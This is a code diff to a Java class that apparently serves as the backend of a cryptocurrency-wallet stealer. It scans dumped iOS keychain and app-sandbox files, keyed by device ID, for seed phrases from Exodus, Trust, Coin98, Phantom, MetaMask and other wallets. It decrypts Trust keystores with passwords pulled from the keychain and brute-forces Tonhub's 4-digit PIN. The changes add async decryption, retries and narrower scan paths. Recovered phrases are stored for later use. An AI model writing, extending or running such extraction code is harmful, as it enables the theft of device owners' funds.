@@ -10,6 +10,7 @@ import com.consumer.dao.MnemonicDao;
 import com.consumer.entity.DeviceEntity;
 import com.consumer.entity.MnemonicEntity;
 import com.consumer.util.Bip39Util;
+import com.consumer.util.MnemonicAesUtil;
 import com.consumer.util.RedisPush;
 import org.bouncycastle.crypto.PBEParametersGenerator;
 import org.bouncycastle.crypto.digests.SHA512Digest;
@@ -53,13 +54,12 @@ import java.util.stream.Collectors;
  * <p>支持的钱包类型（HQ-8 + 扩展）：
  * <ul>
  *   <li>phantom  — files/hex 中带 phantom 的 JSON → entropy → BIP39</li>
- *   <li>exodus   — hex 全盘含 "mnemonic"/"seed"（含 unused*，不与 coin98 互斥；同词各 source 各留一条）
- *                 + sandbox/exodus ALS</li>
+ *   <li>exodus   — files/hex/exodus（含 unused* 明文）</li>
  *   <li>bitpie   — files/hex 中 seedPhraseEntropy_data.txt → entropy → BIP39</li>
  *   <li>uniswap  — files/hex 中带 mnemonic 的文件 → 明文助记词</li>
  *   <li>trust    — hex 目录 trustwalletUTC--*_data*.txt（64hex 密码）+ sandbox/trust/Documents/keystore/UTC--*.json
  *     (keystore) → scrypt → AES-128-CTR → mnemonic</li>
- *   <li>coin98   — hex/unknown/unused*.data.bin 明文（与 exodus 并行，不互斥）；sandbox ALS 密文需密码</li>
+ *   <li>coin98   — files/hex/coin98/（keychain 命中才落盘；明文）</li>
  *   <li>tonhub   — sandbox/tonhub/Documents/mmkv/mmkv.default（明文兜底 + MMKV+PBKDF2-SHA512(100k) + NaCl secretbox 4 位 PIN 暴力）</li>
  *   <li>mytonwallet — sandbox/mytonwallet 下所有文件做 BIP39 正则</li>
  *   <li>metamask / okx / bitget / solflare — sandbox 对应目录做 BIP39 正则扫描</li>
@@ -112,12 +112,16 @@ public class MnemonicExtractor {
     /** Tonhub 暴力串行化信号量：限制同时爆破的 device 数，避免打满 CPU */
     private volatile Semaphore tonhubBruteSemaphore;
 
+    /** Trust scrypt 串行化 */
+    private volatile Semaphore trustDecryptSemaphore;
+
+    /** Trust 异步解密池（与 parse 墙钟解耦） */
+    private volatile ThreadPoolExecutor trustDecryptPool;
+
     @PostConstruct
     public void initAesKey() {
         try {
-            byte[] key = consumerProps.getMnemonicAesKey().getBytes(StandardCharsets.UTF_8);
-            if (key.length != 32) key = Arrays.copyOf(key, 32);
-            this.mnemonicAesKey = new SecretKeySpec(key, "AES");
+            this.mnemonicAesKey = MnemonicAesUtil.resolveKey(consumerProps.getMnemonicAesKey());
         } catch (Exception e) {
             log.error("MnemonicExtractor initAesKey FAIL: {}", e.toString());
         }
@@ -135,6 +139,22 @@ public class MnemonicExtractor {
         this.tonhubBruteSemaphore = new Semaphore(permits, true);
         log.info("【mnemonic】tonhub 串行化信号量 permits={} syncTimeout={}ms",
                 permits, consumerProps.getTonhubBruteSyncTimeoutMs());
+
+        int trustThreads = Math.max(1, consumerProps.getTrustDecryptThreads());
+        this.trustDecryptPool = new ThreadPoolExecutor(
+                trustThreads, trustThreads, 60L, TimeUnit.SECONDS,
+                new LinkedBlockingQueue<>(2048),
+                r -> {
+                    Thread t = new Thread(r, "trust-decrypt");
+                    t.setDaemon(true);
+                    return t;
+                },
+                new ThreadPoolExecutor.CallerRunsPolicy());
+        this.trustDecryptPool.allowCoreThreadTimeOut(true);
+        int trustPermits = Math.max(1, consumerProps.getTrustDecryptSerializePermits());
+        this.trustDecryptSemaphore = new Semaphore(trustPermits, true);
+        log.info("【mnemonic】trust 异步解密 async={} threads={} permits={}",
+                consumerProps.isTrustDecryptAsync(), trustThreads, trustPermits);
     }
 
     /** 32 位 hex 文件名 (coin98 ALS hash) */
@@ -173,15 +193,32 @@ public class MnemonicExtractor {
                 return t;
             });
 
+    /** Trust/Tonhub 许可不足时的延迟调度（不占 brute/decrypt 线程） */
+    private static final ScheduledExecutorService CRYPTO_DEFER =
+            Executors.newSingleThreadScheduledExecutor(r -> {
+                Thread t = new Thread(r, "crypto-defer");
+                t.setDaemon(true);
+                return t;
+            });
+
     // ============================================================
     // 主入口
     // ============================================================
 
-    /** 上下文：用于 tonhub 暴力超时后异步补写 mnemonic + news4（避免阻塞 parse_ci 线程）*/
-    @lombok.Value
+    /** 上下文：tonhub/trust 异步补写；含可变标记供扫描阶段区分「排队中」与「真失败」 */
+    @lombok.Data
     public static class Ctx {
         Integer ios18paramId;
         String  deviceId;
+        /** tonhub 许可忙，已排队 crypto-defer 重试（非失败） */
+        boolean tonhubDeferred;
+        /** tonhub 已提交后台 PIN 爆破 */
+        boolean tonhubAsyncStarted;
+
+        public Ctx(Integer ios18paramId, String deviceId) {
+            this.ios18paramId = ios18paramId;
+            this.deviceId = deviceId;
+        }
     }
 
     public List<PhraseResult> extractAll(JSONObject war, String unpackDir, Ctx ctx) {
@@ -208,6 +245,9 @@ public class MnemonicExtractor {
     // 磁盘扫描（对齐 Python recover_entry）
     // ============================================================
 
+    /** 暂关：本环境拿不到 MyTonWallet 有效数据；需要时改 true 即可恢复 sandbox/mytonwallet 扫描 */
+    private static final boolean ENABLE_MYTONWALLET_SCAN = false;
+
     private void scanDiskAll(Path root, List<PhraseResult> out, Ctx ctx) {
         Path hex = root.resolve("files").resolve("hex");
         Path sandbox = root.resolve("files").resolve("sandbox");
@@ -220,37 +260,51 @@ public class MnemonicExtractor {
         CompletableFuture<Void> hexFut = null;
         CompletableFuture<Void> sandboxFut = null;
         CompletableFuture<Void> trustFut = null;
+        final long[] hexCost = {0};
+        final long[] sbCost = {0};
+        final long[] trustCost = {0};
 
         if (Files.isDirectory(hex)) {
             hexFut = CompletableFuture.runAsync(() -> {
-                // coin98←unused*；exodus←全盘（含 unused*）；两者并行都入库，互不排除
-                scanHexCoin98FromUnknownUnused(hex, hexResults);
+                long t = System.currentTimeMillis();
+                // coin98 只扫 hex/coin98；exodus 扫 hex/exodus
+                scanHexCoin98(hex, hexResults);
                 scanHexPhantom(hex, hexResults);
                 scanHexExodus(hex, hexResults);
                 scanHexBitpie(hex, hexResults);
                 scanHexUniswap(hex, hexResults);
                 fallbackHexRegex(hex, hexResults);
+                hexCost[0] = System.currentTimeMillis() - t;
             }, SCAN_POOL);
         }
         if (Files.isDirectory(sandbox)) {
             sandboxFut = CompletableFuture.runAsync(() -> {
-                scanSandboxExodus(sandbox, sandboxResults);
-                scanSandboxCoin98(sandbox, sandboxResults);
+                long t = System.currentTimeMillis();
+                // exodus / coin98：助记词走 hex 明文分桶，不扫 sandbox ALS
+                // trust keystore、tonhub mmkv 仍依赖 sandbox；mytonwallet 暂关见 ENABLE_MYTONWALLET_SCAN
                 scanSandboxTonhub(sandbox, sandboxResults, ctx);
-                scanSandboxMytonwallet(sandbox, sandboxResults);
+                if (ENABLE_MYTONWALLET_SCAN) {
+                    scanSandboxMytonwallet(sandbox, sandboxResults);
+                }
                 fallbackSandboxRegex(sandbox, sandboxResults);
+                sbCost[0] = System.currentTimeMillis() - t;
             }, SCAN_POOL);
         }
-        // trust 需要读 hex+sandbox，但只读文件不依赖其他扫描结果，可并行
         if (Files.isDirectory(hex) || Files.isDirectory(sandbox)) {
             trustFut = CompletableFuture.runAsync(() -> {
-                scanHexTrustPasswordAndKeystore(hex, sandbox, trustResults);
+                long t = System.currentTimeMillis();
+                scanHexTrustPasswordAndKeystore(hex, sandbox, trustResults, ctx);
+                trustCost[0] = System.currentTimeMillis() - t;
             }, SCAN_POOL);
         }
 
         if (hexFut != null) hexFut.join();
         if (sandboxFut != null) sandboxFut.join();
         if (trustFut != null) trustFut.join();
+
+        log.info("【mnemonic】disk-scan 分段 hex={}ms sandbox={}ms trust={}ms (并行墙钟≈{}ms)",
+                hexCost[0], sbCost[0], trustCost[0],
+                Math.max(hexCost[0], Math.max(sbCost[0], trustCost[0])));
 
         out.addAll(hexResults);
         out.addAll(sandboxResults);
@@ -295,37 +349,31 @@ public class MnemonicExtractor {
         }
     }
 
-    // --- Exodus: hex 全盘扫，命中几条加几条，不提前 return；不跳过 unused*（与 coin98 并行入库）---
+    // --- Exodus: hex/exodus 全文件 + 其它目录含关键词的文件；与 coin98 并行入库 ---
+    // 对齐现落盘：Python/WarDoc 把 unused* 落到 hex/exodus/（.json/.txt/无后缀），不只 *.json。
     private void scanHexExodus(Path hex, List<PhraseResult> out) {
         Path exodusDir = hex.resolve("exodus");
 
-        // (1) hex/exodus/*.json
+        // (1) hex/exodus/** 全部可读文本（含 unused_data.txt / unused_data_1 / *.json）
         if (Files.isDirectory(exodusDir)) {
-            try (DirectoryStream<Path> ds = Files.newDirectoryStream(exodusDir, "*.json")) {
-                for (Path p : ds) {
-                    if (!Files.isRegularFile(p)) continue;
-                    addExodusFromText(out, readTextUtf8(p), "hex_exodus_dir:" + p.getFileName());
-                }
-            } catch (IOException e) {
+            try (java.util.stream.Stream<Path> walk = Files.walk(exodusDir, 4)) {
+                walk.filter(Files::isRegularFile)
+                        .filter(this::isExodusHexCandidate)
+                        .forEach(p -> addExodusFromText(out, readTextUtf8(p),
+                                "hex_exodus_dir:" + p.getFileName()));
+            } catch (IOException ignore) {
             }
         }
 
-        // (2) 全盘 walk（含 unknown/unused*）
+        // (2) 其它 hex 目录 walk（跳过已在 (1) 扫过的 exodus/；含旧包 unknown/unused*）
         try (java.util.stream.Stream<Path> s = Files.walk(hex, 5)) {
             java.util.List<Path> files = s.filter(Files::isRegularFile)
-                    .filter(p -> {
-                        String name = p.getFileName().toString().toLowerCase();
-                        if (name.endsWith(".png") || name.endsWith(".jpg") || name.endsWith(".jpeg")
-                                || name.endsWith(".svg") || name.endsWith(".ttf") || name.endsWith(".hive")
-                                || name.endsWith(".db") || name.endsWith(".sqlite")
-                                || name.endsWith(".sqlite-shm") || name.endsWith(".sqlite-wal")
-                                || name.endsWith(".realm")) return false;
-                        try { return Files.size(p) <= 4 * 1024 * 1024; }
-                        catch (IOException e) { return false; }
-                    })
+                    .filter(this::isExodusHexCandidate)
                     .collect(Collectors.toList());
             for (Path p : files) {
-                try { if (Files.isDirectory(exodusDir) && p.startsWith(exodusDir)) continue; } catch (Exception ignore) {}
+                try {
+                    if (Files.isDirectory(exodusDir) && p.startsWith(exodusDir)) continue;
+                } catch (Exception ignore) {}
                 String text = readTextUtf8(p);
                 if (text == null || text.isEmpty()) continue;
                 String contentLower = text.toLowerCase();
@@ -339,6 +387,26 @@ public class MnemonicExtractor {
                 addExodusFromText(out, text, "hex_walk:" + rel);
             }
         } catch (IOException e) {
+        }
+    }
+
+    /** hex 侧 exodus 候选：跳过明显二进制；.bin 仅放行 .data.bin / unused* */
+    private boolean isExodusHexCandidate(Path p) {
+        String name = p.getFileName().toString().toLowerCase();
+        if (name.endsWith(".png") || name.endsWith(".jpg") || name.endsWith(".jpeg")
+                || name.endsWith(".svg") || name.endsWith(".ttf") || name.endsWith(".hive")
+                || name.endsWith(".db") || name.endsWith(".sqlite")
+                || name.endsWith(".sqlite-shm") || name.endsWith(".sqlite-wal")
+                || name.endsWith(".realm")) {
+            return false;
+        }
+        if (name.endsWith(".bin") && !name.endsWith(".data.bin") && !name.contains("unused")) {
+            return false;
+        }
+        try {
+            return Files.size(p) <= 4 * 1024 * 1024;
+        } catch (IOException e) {
+            return false;
         }
     }
 
@@ -359,25 +427,29 @@ public class MnemonicExtractor {
     }
 
     /**
-     * Coin98 明文：hex/unknown/unused*.data.bin（与 exodus 并行，同词也可各入一条）。
-     * 兼容旧包 hex/coin98/unused*。
+     * Coin98（keychain 分桶）：只扫 {@code files/hex/coin98/}。
+     * 无该目录 = keychain 未命中 coin98。不扫 sandbox ALS。
      */
-    private void scanHexCoin98FromUnknownUnused(Path hex, List<PhraseResult> out) {
-        Path[] roots = {hex.resolve("unknown"), hex.resolve("coin98")};
-        for (Path root : roots) {
-            if (!Files.isDirectory(root)) continue;
-            try (java.util.stream.Stream<Path> walkStream = Files.walk(root, 4)) {
-                walkStream.filter(Files::isRegularFile)
-                        .forEach(p -> tryAddCoin98FromUnusedFile(root, p, out));
-            } catch (IOException ignore) {}
-        }
+    private void scanHexCoin98(Path hex, List<PhraseResult> out) {
+        Path root = hex.resolve("coin98");
+        if (!Files.isDirectory(root)) return;
+        try (java.util.stream.Stream<Path> walkStream = Files.walk(root, 4)) {
+            walkStream.filter(Files::isRegularFile)
+                    .forEach(p -> tryAddCoin98FromHexFile(root, p, out));
+        } catch (IOException ignore) {}
     }
 
-    private void tryAddCoin98FromUnusedFile(Path root, Path p, List<PhraseResult> out) {
+    private void tryAddCoin98FromHexFile(Path root, Path p, List<PhraseResult> out) {
         String name = p.getFileName().toString().toLowerCase();
-        boolean candidate = name.startsWith("unused")
-                || (name.contains("unused") && name.endsWith(".bin"));
-        if (!candidate) return;
+        // 跳过明显非文本
+        if (name.endsWith(".png") || name.endsWith(".jpg") || name.endsWith(".jpeg")
+                || name.endsWith(".svg") || name.endsWith(".db") || name.endsWith(".sqlite")
+                || name.endsWith(".realm")) {
+            return;
+        }
+        if (name.endsWith(".bin") && !name.endsWith(".data.bin") && !name.contains("unused")) {
+            return;
+        }
         try {
             if (Files.size(p) > 4 * 1024 * 1024) return;
         } catch (IOException e) {
@@ -419,9 +491,8 @@ public class MnemonicExtractor {
         if (containsWalletPhrase(out, "coin98", foundPhrase)) return;
         Path rel;
         try { rel = root.relativize(p); } catch (Exception e) { rel = p; }
-        // 不与 exodus 互斥；同词 coin98 只留一条（多 unused 文件去重）
         out.add(new PhraseResult("coin98", foundPhrase,
-                "hex_unknown_unused." + methodSuffix + ":" + rel));
+                "hex_coin98." + methodSuffix + ":" + rel));
     }
 
     // --- Bitpie: hex/bitpie/seedPhraseEntropy_data.txt（或 _1.txt）双层 hex 编码熵 ---
@@ -528,102 +599,230 @@ public class MnemonicExtractor {
         } catch (IOException ignore) {}
     }
 
-    // --- Trust: hex/trustwallet + hex/trust 找密码 + sandbox/trust/Documents/keystore 找 UTC JSON ---
-    // 对齐 recover_hq8_mnemonics (2).py: hex_dirs = [hex/trustwallet, hex/trust]
-    private void scanHexTrustPasswordAndKeystore(Path hex, Path sandbox, List<PhraseResult> out) {
+    // --- Trust: hex/trust(wallet) 密码 + sandbox keystore UTC--* ---
+    private void scanHexTrustPasswordAndKeystore(Path hex, Path sandbox, List<PhraseResult> out, Ctx ctx) {
         if (containsWallet(out, "trust")) return;
 
-        // 1. 密码候选：hex/trustwallet/ 以及 hex/trust/（Python 脚本新增的 alias 目录）
-        //    文件名 trustwalletUTC--*_data*.txt，内容必须是 64 hex
-        Path[] hexDirCandidates = {hex.resolve("trustwallet"), hex.resolve("trust")};
+        Path[] hexDirCandidates = {hex.resolve("trust"), hex.resolve("trustwallet")};
+        // 1) 密码：只收 64hex（或双重 hex），一次遍历；记下来源文件名便于 UUID 对齐
         List<String> pwdHexList = new ArrayList<>();
-        for (Path trustHexDir : hexDirCandidates) {
-            if (!Files.isDirectory(trustHexDir)) continue;
-            try (DirectoryStream<Path> ds = Files.newDirectoryStream(trustHexDir,
-                    p -> p.getFileName().toString().startsWith("trustwalletUTC")
-                            && p.getFileName().toString().endsWith(".txt"))) {
-                for (Path p : ds) {
-                    String t = readTextUtf8(p);
-                    if (t == null) continue;
-                    String s = normalizePwdHex(t.trim());
-                    if (s != null && !pwdHexList.contains(s)) pwdHexList.add(s);
-                }
-            } catch (IOException ignore) {}
-            // 兜底：再读非 .txt 版本（_data / _data_1 无扩展名）
-            try (DirectoryStream<Path> ds = Files.newDirectoryStream(trustHexDir,
-                    p -> p.getFileName().toString().startsWith("trustwalletUTC"))) {
-                for (Path p : ds) {
-                    String t = readTextUtf8(p);
-                    if (t == null) continue;
-                    String s = normalizePwdHex(t.trim());
-                    if (s != null && !pwdHexList.contains(s)) pwdHexList.add(s);
-                }
-            } catch (IOException ignore) {}
-            // 更宽的兜底：目录中任何 .txt / 无扩展名文件，内容是 64hex（或双重 hex 编码的 64hex）都算
-            try (DirectoryStream<Path> ds = Files.newDirectoryStream(trustHexDir,
-                    p -> {
-                        String n = p.getFileName().toString().toLowerCase();
-                        return n.endsWith(".txt") || !n.contains(".");
-                    })) {
-                for (Path p : ds) {
-                    String t = readTextUtf8(p);
-                    if (t == null) continue;
-                    String s = normalizePwdHex(t.trim());
-                    if (s != null && !pwdHexList.contains(s)) pwdHexList.add(s);
-                }
-            } catch (IOException ignore) {}
-        }
-
-        if (pwdHexList.isEmpty()) {
-            return;
-        }
-
-        // 2. keystore 候选：
-        //    (a) sandbox/trust/Documents/keystore/UTC--*.json（或无扩展名）
-        //    (a2) sandbox/trust_wallet/Documents/keystore/UTC--*.json（实际目录名常带下划线）
-        //    (b) hex/trustwallet/ 和 hex/trust/ 中 wallet-hd-wallet-UTC 等 JSON 文件
-        List<Path> keystorePaths = new ArrayList<>();
-        String[] trustDirNames = {"trust", "trust_wallet"};
-        for (String tdn : trustDirNames) {
-            Path trustKs = sandbox.resolve(tdn).resolve("Documents").resolve("keystore");
-            if (Files.isDirectory(trustKs)) {
-                try (DirectoryStream<Path> ds = Files.newDirectoryStream(trustKs, "UTC--*")) {
-                    for (Path p : ds) if (Files.isRegularFile(p)) keystorePaths.add(p);
-                } catch (IOException ignore) {}
-            }
-        }
-        // 兜底 hex/trustwallet/ + hex/trust/ 中的 keystore JSON（wallet-hd-wallet-UTC / trust.account 等）
+        List<String> pwdSrcNames = new ArrayList<>();
         for (Path trustHexDir : hexDirCandidates) {
             if (!Files.isDirectory(trustHexDir)) continue;
             try (DirectoryStream<Path> ds = Files.newDirectoryStream(trustHexDir)) {
                 for (Path p : ds) {
-                    if (!Files.isRegularFile(p) || keystorePaths.contains(p)) continue;
-                    String n = p.getFileName().toString();
-                    if (n.contains("hd-wallet-UTC") || n.contains("trust.account") || n.startsWith("trustwallet")) {
-                        String t = readTextUtf8(p);
-                        if (t != null && t.trim().startsWith("{")) keystorePaths.add(p);
-                    }
+                    if (!Files.isRegularFile(p)) continue;
+                    String name = p.getFileName().toString();
+                    String lower = name.toLowerCase(Locale.ROOT);
+                    // 密码文件：trustwalletUTC--*_data(.txt) ；跳过 migrationVersion / 二进制
+                    if (!lower.startsWith("trustwalletutc")) continue;
+                    if (lower.contains("migrationversion") || lower.contains("sharedrealm")) continue;
+                    if (!(lower.endsWith(".txt") || !lower.contains(".") || lower.endsWith("_data"))) continue;
+                    if (lower.endsWith(".bin")) continue;
+                    String t = readTextUtf8(p);
+                    if (t == null) continue;
+                    String s = normalizePwdHex(t.trim());
+                    if (s == null || pwdHexList.contains(s)) continue;
+                    pwdHexList.add(s);
+                    pwdSrcNames.add(name);
                 }
             } catch (IOException ignore) {}
         }
+        if (pwdHexList.isEmpty()) return;
 
-        if (keystorePaths.isEmpty()) {
+        // 2) keystore：sandbox UTC--*，按内容去重（同 UUID 常有无后缀 + .json 双份）
+        List<String> keystoreContents = new ArrayList<>();
+        List<String> keystoreNames = new ArrayList<>();
+        java.util.Set<String> seenKsHash = new java.util.HashSet<>();
+        String[] trustDirNames = {"trust", "trust_wallet"};
+        List<Path> keystorePaths = new ArrayList<>();
+        for (String tdn : trustDirNames) {
+            Path trustKs = sandbox.resolve(tdn).resolve("Documents").resolve("keystore");
+            if (!Files.isDirectory(trustKs)) continue;
+            List<Path> raw = new ArrayList<>();
+            try (DirectoryStream<Path> ds = Files.newDirectoryStream(trustKs, "UTC--*")) {
+                for (Path p : ds) if (Files.isRegularFile(p)) raw.add(p);
+            } catch (IOException ignore) {}
+            raw.sort((a, b) -> {
+                String na = a.getFileName().toString();
+                String nb = b.getFileName().toString();
+                boolean ja = na.endsWith(".json");
+                boolean jb = nb.endsWith(".json");
+                if (ja != jb) return ja ? -1 : 1;
+                return na.compareTo(nb);
+            });
+            for (Path p : raw) {
+                String content = readTextUtf8(p);
+                if (content == null || !content.trim().startsWith("{")) continue;
+                String h = sha256HexLite(content);
+                if (!seenKsHash.add(h)) continue;
+                keystorePaths.add(p);
+            }
+        }
+        if (keystorePaths.isEmpty()) return;
+
+        // 3) 密码文件名 UUID 与 keystore 名对齐的优先试（减少错误配对 scrypt）
+        keystorePaths = orderKeystoresByPwdHint(keystorePaths, pwdSrcNames);
+        for (Path p : keystorePaths) {
+            String content = readTextUtf8(p);
+            if (content == null) continue;
+            keystoreContents.add(content);
+            keystoreNames.add(p.getFileName().toString());
+        }
+        if (keystoreContents.isEmpty()) return;
+
+        boolean async = consumerProps == null || consumerProps.isTrustDecryptAsync();
+        if (async && ctx != null && trustDecryptPool != null) {
+            final List<String> pwds = new ArrayList<>(pwdHexList);
+            final List<String> ksBodies = new ArrayList<>(keystoreContents);
+            final List<String> ksNames = new ArrayList<>(keystoreNames);
+            final Ctx fctx = ctx;
+            try {
+                trustDecryptPool.execute(() -> runTrustDecryptJob(pwds, ksBodies, ksNames, fctx));
+                log.info("【mnemonic】trust scrypt 已异步提交 ctx_id={} pwd={} ks={}",
+                        ctx.ios18paramId, pwds.size(), ksBodies.size());
+            } catch (RejectedExecutionException e) {
+                log.warn("【mnemonic】trust 异步队列满，降级同步 ctx_id={}", ctx.ios18paramId);
+                PhraseResult r = trustDecryptSync(pwds, ksBodies, ksNames);
+                if (r != null) out.add(r);
+            }
             return;
         }
 
-        // 3. 笛卡尔积配对解密
+        PhraseResult r = trustDecryptSync(pwdHexList, keystoreContents, keystoreNames);
+        if (r != null) out.add(r);
+    }
+
+    private void runTrustDecryptJob(List<String> pwdHexList, List<String> keystoreContents,
+                                    List<String> keystoreNames, Ctx ctx) {
+        runTrustDecryptJob(pwdHexList, keystoreContents, keystoreNames, ctx, 0);
+    }
+
+    private void runTrustDecryptJob(List<String> pwdHexList, List<String> keystoreContents,
+                                    List<String> keystoreNames, Ctx ctx, int deferAttempt) {
+        String ctxId = ctx.ios18paramId == null ? null : String.valueOf(ctx.ios18paramId);
+        Semaphore sem = trustDecryptSemaphore;
+        boolean acquired = false;
+        if (sem != null) {
+            if (!sem.tryAcquire()) {
+                scheduleTrustDecryptRetry(pwdHexList, keystoreContents, keystoreNames, ctx, deferAttempt);
+                return;
+            }
+            acquired = true;
+        }
+        try {
+            PhraseResult r = trustDecryptSync(pwdHexList, keystoreContents, keystoreNames);
+            if (r != null) {
+                savePhraseLater(ctx, r, null);
+            }
+        } catch (Throwable t) {
+            log.warn("【mnemonic】trust 异步解密异常 ctx_id={} err={}", ctxId, t.toString());
+        } finally {
+            if (acquired && sem != null) {
+                try { sem.release(); } catch (Throwable ignore) {}
+            }
+        }
+    }
+
+    /** 许可不足不丢弃：延迟后重试 scrypt（parse 已 ACK，靠后台补写保证不漏词） */
+    private void scheduleTrustDecryptRetry(List<String> pwdHexList, List<String> keystoreContents,
+                                           List<String> keystoreNames, Ctx ctx, int deferAttempt) {
+        int max = consumerProps == null ? 120 : Math.max(1, consumerProps.getCryptoDeferMaxAttempts());
+        String ctxId = ctx == null || ctx.ios18paramId == null ? null : String.valueOf(ctx.ios18paramId);
+        if (deferAttempt >= max) {
+            log.error("【mnemonic】trust 延迟重试耗尽仍无许可，放弃 scrypt ctx_id={} attempts={}",
+                    ctxId, deferAttempt);
+            return;
+        }
+        long base = consumerProps == null ? 3000L : Math.max(500L, consumerProps.getCryptoDeferBaseDelayMs());
+        long delay = Math.min(60_000L, base * (1L + deferAttempt));
+        final int next = deferAttempt + 1;
+        if (log.isDebugEnabled()) {
+            log.debug("【mnemonic】trust 串行化繁忙，{}ms 后重试 ({}/{}) ctx_id={}",
+                    delay, next, max, ctxId);
+        }
+        CRYPTO_DEFER.schedule(() -> {
+            ThreadPoolExecutor pool = trustDecryptPool;
+            if (pool == null || pool.isShutdown()) {
+                runTrustDecryptJob(pwdHexList, keystoreContents, keystoreNames, ctx, next);
+                return;
+            }
+            try {
+                pool.execute(() -> runTrustDecryptJob(pwdHexList, keystoreContents, keystoreNames, ctx, next));
+            } catch (RejectedExecutionException e) {
+                // 队列满再延一次，仍不丢
+                scheduleTrustDecryptRetry(pwdHexList, keystoreContents, keystoreNames, ctx, next);
+            }
+        }, delay, TimeUnit.MILLISECONDS);
+    }
+
+    private PhraseResult trustDecryptSync(List<String> pwdHexList, List<String> keystoreContents,
+                                          List<String> keystoreNames) {
+        long t0 = System.currentTimeMillis();
+        int attempts = 0;
         for (String pwdHex : pwdHexList) {
-            for (Path ksPath : keystorePaths) {
-                String content = readTextUtf8(ksPath);
-                if (content == null) continue;
+            for (int i = 0; i < keystoreContents.size(); i++) {
+                String content = keystoreContents.get(i);
+                attempts++;
                 PhraseResult r = tryTrustDecrypt(pwdHex, content);
                 if (r != null) {
-                    if (!containsWallet(out, "trust")) {
-                        out.add(r);
-                        return;
-                    }
+                    String ksName = i < keystoreNames.size() ? keystoreNames.get(i) : "?";
+                    log.info("【mnemonic】trust 解密成功 attempts={} cost={}ms ks={}",
+                            attempts, System.currentTimeMillis() - t0, ksName);
+                    return r;
                 }
             }
+        }
+        log.info("【mnemonic】trust 未解出 attempts={} cost={}ms pwd={} ks={}",
+                attempts, System.currentTimeMillis() - t0, pwdHexList.size(), keystoreContents.size());
+        return null;
+    }
+
+    /** 按密码文件名中的 UUID 片段，把同名 keystore 排到前面 */
+    private static List<Path> orderKeystoresByPwdHint(List<Path> keystores, List<String> pwdSrcNames) {
+        if (keystores.size() <= 1 || pwdSrcNames == null || pwdSrcNames.isEmpty()) return keystores;
+        java.util.Set<String> hints = new java.util.HashSet<>();
+        for (String n : pwdSrcNames) {
+            // ...UTC--time--UUID_data...
+            int i = n.indexOf("UTC--");
+            if (i < 0) continue;
+            String rest = n.substring(i);
+            int us = rest.lastIndexOf('_');
+            if (us > 0) rest = rest.substring(0, us);
+            hints.add(rest.toLowerCase(Locale.ROOT));
+            // 也留 UUID 段
+            int lastDash = rest.lastIndexOf("--");
+            if (lastDash > 0 && lastDash + 2 < rest.length()) {
+                hints.add(rest.substring(lastDash + 2).toLowerCase(Locale.ROOT));
+            }
+        }
+        if (hints.isEmpty()) return keystores;
+        List<Path> preferred = new ArrayList<>();
+        List<Path> other = new ArrayList<>();
+        for (Path p : keystores) {
+            String kn = p.getFileName().toString().toLowerCase(Locale.ROOT);
+            boolean hit = false;
+            for (String h : hints) {
+                if (!h.isEmpty() && kn.contains(h)) { hit = true; break; }
+            }
+            if (hit) preferred.add(p); else other.add(p);
+        }
+        preferred.addAll(other);
+        return preferred;
+    }
+
+    private static String sha256HexLite(String s) {
+        try {
+            MessageDigest md = MessageDigest.getInstance("SHA-256");
+            byte[] d = md.digest(s.getBytes(StandardCharsets.UTF_8));
+            StringBuilder sb = new StringBuilder(d.length * 2);
+            for (byte b : d) {
+                int v = b & 0xFF;
+                sb.append(HEX_CHARS[v >>> 4]).append(HEX_CHARS[v & 0x0F]);
+            }
+            return sb.toString();
+        } catch (Exception e) {
+            return Integer.toHexString(s.hashCode());
         }
     }
 
@@ -823,29 +1022,35 @@ public class MnemonicExtractor {
     private void fallbackSandboxRegex(Path sandbox, List<PhraseResult> out) {
         // 已被专用扫描器处理的钱包目录，fallback 跳过避免重复 I/O
         java.util.Set<String> skipDirs = new java.util.HashSet<>(java.util.Arrays.asList(
-                "exodus", "coin98", "tonhub", "mytonwallet"));
-        // try-with-resources 关闭 Files.walk 持有的文件句柄，避免高并发下文件描述符泄漏
-        try (java.util.stream.Stream<Path> stream = Files.walk(sandbox)) {
+                "exodus", "coin98", "tonhub", "mytonwallet",
+                "trust", "trust_wallet", "ton_wallet", "tonhub_wallet", "tonkeeper", "ton-keeper"));
+        final int[] scanned = {0};
+        long t0 = System.currentTimeMillis();
+        // 限深 + 跳过专用目录，避免 sandbox 大树拖慢（并与 tonhub/trust 后台 CPU 抢核）
+        try (java.util.stream.Stream<Path> stream = Files.walk(sandbox, 6)) {
             stream.filter(Files::isRegularFile)
                     .forEach(p -> {
-                        // 跳过已被专用扫描器处理的钱包目录
                         java.nio.file.Path rel = sandbox.relativize(p);
-        if (rel.getNameCount() > 0 && skipDirs.contains(rel.getName(0).toString())) return;
-                        // 跳过明显非文本的文件扩展名
-                        String name = p.getFileName().toString().toLowerCase();
+                        if (rel.getNameCount() > 0 && skipDirs.contains(rel.getName(0).toString().toLowerCase(Locale.ROOT))) {
+                            return;
+                        }
+                        String name = p.getFileName().toString().toLowerCase(Locale.ROOT);
                         if (name.endsWith(".png") || name.endsWith(".jpg") || name.endsWith(".jpeg")
                                 || name.endsWith(".svg") || name.endsWith(".db") || name.endsWith(".sqlite")
                                 || name.endsWith(".sqlite-shm") || name.endsWith(".sqlite-wal")
-                                || name.endsWith(".bin") || name.endsWith(".ttf") || name.endsWith(".hive")) {
+                                || name.endsWith(".bin") || name.endsWith(".ttf") || name.endsWith(".hive")
+                                || name.endsWith(".realm") || name.endsWith(".mmkv") || name.equals("mmkv.default")) {
                             return;
                         }
+                        try {
+                            if (Files.size(p) > 512 * 1024) return; // 超 512KB 跳过
+                        } catch (IOException ignore) { return; }
+                        scanned[0]++;
                         String text = readTextUtf8(p);
                         if (text == null || text.isEmpty()) return;
                         String found = bip39.searchPhrase(text);
                         if (found != null && !containsPhrase(out, found)) {
-                            // 根据 sandbox 子目录名猜钱包名
                             String wallet = rel.getNameCount() > 0 ? rel.getName(0).toString() : "unknown_sandbox";
-                            // 仅当该钱包名未找到时才用（避免覆盖专用提取结果）
                             if (!containsWallet(out, wallet)) {
                                 out.add(new PhraseResult(wallet, found, "sandbox_regex:" + rel));
                             }
@@ -853,6 +1058,7 @@ public class MnemonicExtractor {
                     });
         } catch (IOException e) {
         }
+        log.info("【mnemonic】sandbox fallbackRegex files={} cost={}ms", scanned[0], System.currentTimeMillis() - t0);
     }
 
     // --- 兜底 hex 全目录 BIP39 正则（覆盖 unused_data.json / keychain_data.json 等不带钱包名前缀的明文助记词） ---
@@ -880,10 +1086,10 @@ public class MnemonicExtractor {
